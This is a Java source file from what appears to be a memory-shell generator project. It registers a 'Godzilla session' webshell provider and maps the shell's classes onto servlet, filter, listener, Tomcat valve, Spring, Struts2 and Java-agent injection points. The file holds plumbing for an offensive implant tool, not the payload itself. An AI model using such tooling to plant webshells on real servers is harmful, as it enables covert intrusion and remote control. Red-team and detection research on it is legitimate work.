package com.reajason.javaweb.memshell.shelltool.godzilla.session;

import com.reajason.javaweb.ShellGenerator;
import com.reajason.javaweb.memshell.ShellTool;
import com.reajason.javaweb.memshell.config.ShellToolConfig;
import com.reajason.javaweb.memshell.server.ToolMapping;
import com.reajason.javaweb.memshell.shelltool.godzilla.GodzillaConfig;
import com.reajason.javaweb.memshell.spi.ShellToolMeta;
import com.reajason.javaweb.memshell.spi.ShellToolProvider;

import org.kohsuke.MetaInfServices;

import static com.reajason.javaweb.memshell.ShellType.*;

/**
 * 哥斯拉会话版：core 跟随 HttpSession 而不是静态字段（issue #159），
 * 覆盖所有能拿到 HttpSession 的挂载类型（含 request 带 getSession() 的 Agent 场景）
 *
 * @author ReaJason
 */
@MetaInfServices(ShellToolProvider.class)
@ShellToolMeta(name = ShellTool.GodzillaSession, order = 11)
public class GodzillaSessionShellToolProvider implements ShellToolProvider {

    @Override
    public ToolMapping getToolMapping() {
        String base = "com.reajason.javaweb.memshell.shelltool.godzilla.session.";
        return ToolMapping.builder()
                .addShellClass(SERVLET, base + "GodzillaSessionServlet")
                .addShellClass(JAKARTA_SERVLET, base + "GodzillaSessionServlet")
                .addShellClass(FILTER, base + "GodzillaSessionFilter")
                .addShellClass(JAKARTA_FILTER, base + "GodzillaSessionFilter")
                .addShellClass(LISTENER, base + "GodzillaSessionListener")
                .addShellClass(JAKARTA_LISTENER, base + "GodzillaSessionListener")
                .addShellClass(VALVE, base + "GodzillaSessionValve")
                .addShellClass(JAKARTA_VALVE, base + "GodzillaSessionValve")
                .addShellClass(SPRING_WEBMVC_INTERCEPTOR, base + "GodzillaSessionInterceptor")
                .addShellClass(SPRING_WEBMVC_JAKARTA_INTERCEPTOR, base + "GodzillaSessionInterceptor")
                .addShellClass(SPRING_WEBMVC_CONTROLLER_HANDLER, base + "GodzillaSessionControllerHandler")
                .addShellClass(SPRING_WEBMVC_JAKARTA_CONTROLLER_HANDLER, base + "GodzillaSessionControllerHandler")
                .addShellClass(ACTION, base + "GodzillaSessionStruts2Action")
                // Agent 场景的全反射模板：这些入口拿到的 request 同样带 getSession()
                .addShellClass(PROXY_VALVE, base + "GodzillaSession")
                .addShellClass(JAKARTA_PROXY_VALVE, base + "GodzillaSession")
                .addShellClass(AGENT_FILTER_CHAIN, base + "GodzillaSession")
                .addShellClass(CATALINA_AGENT_CONTEXT_VALVE, base + "GodzillaSession")
                .addShellClass(SPRING_WEBMVC_AGENT_FRAMEWORK_SERVLET, base + "GodzillaSession")
                .addShellClass(WEBLOGIC_AGENT_SERVLET_CONTEXT, base + "GodzillaSession")
                .addShellClass(WAS_AGENT_FILTER_MANAGER, base + "GodzillaSession")
                .build();
    }

    @Override
    public Class<? extends ShellToolConfig> getConfigClass() {
        return GodzillaConfig.class;
    }

    @Override
    public Class<? extends ShellGenerator> getGeneratorClass() {
        return GodzillaSessionGenerator.class;
    }
}
